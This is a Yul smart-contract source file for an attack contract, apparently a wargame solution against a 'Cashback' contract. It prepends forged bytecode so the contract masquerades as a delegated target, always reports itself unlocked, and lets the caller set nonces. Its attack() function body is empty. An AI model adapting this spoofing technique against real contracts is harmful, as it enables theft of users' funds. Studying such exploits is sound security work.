object "InjectedCashbackAttack" {
    code {
        let injectedSize := datasize("injected")
        let runtimeSize := datasize("runtime")
        let ptr := 0x00

        // copy the injected bytecode
        datacopy(ptr, dataoffset("injected"), injectedSize)

        // copy the code logic
        datacopy(add(ptr, injectedSize), dataoffset("runtime"), runtimeSize)

        return (ptr, add(injectedSize, runtimeSize))
    }

    // Code we want to inject to masquerade as the deletegated contract
    // Cashback contract addr: 0xdCc409Af2566c47F6DA4d30Eae8155b332A64078
    data "injected" hex"603056dCc409Af2566c47F6DA4d30Eae8155b332A64078000000000000000000000000000000000000000000000000005B"

    object "runtime" {
        code {
            // protection against sending Ether
            require(iszero(callvalue()))

            // dispatchers
            switch selector()
            case 0x3c48664c { // attack(address, address)

            }
            case 0x8380edb7 { // isUnlocked()
                returnTrue()
            }
            case 0xf360c183 { // setNonce(uint256)
                setNonce(decodeAsUint(0))
            }
            case 0x34b15118 { // consumeNonce()
                returnUint(nonce())
            }
            default {
                revert(0, 0)
            }

            /* ------- calldata decoding functions ------- */
            function selector() -> s {
                s := div(calldataload(0), 0x100000000000000000000000000000000000000000000000000000000)
            }

            function decodeAsUint(offset) -> v {
                let pos := add(4, mul(offset, 0x20))
                if lt(calldatasize(), add(pos, 0x20)) {
                    revert(0,0)
                }
                v := calldataload(pos)
            }

            /* ------- calldata encoding functions ------- */
            function returnUint(v) {
                mstore(0, v)
                return (0, 0x20)
            }

            function returnTrue() {
                returnUint(1)
            }

            /* ------- storage layout ------- */
            function noncePos() -> p {
                p := 0
            }

            /* ------- storage access ------- */
            function nonce() -> n {
                n := sload(noncePos())
            }

            function setNonce(n) {
                sstore(noncePos(), n)
            }

            /* ------- utility functions ------- */
            function require(condition) {
                if iszero(condition) { revert(0, 0) }
            }
        }
    }
}
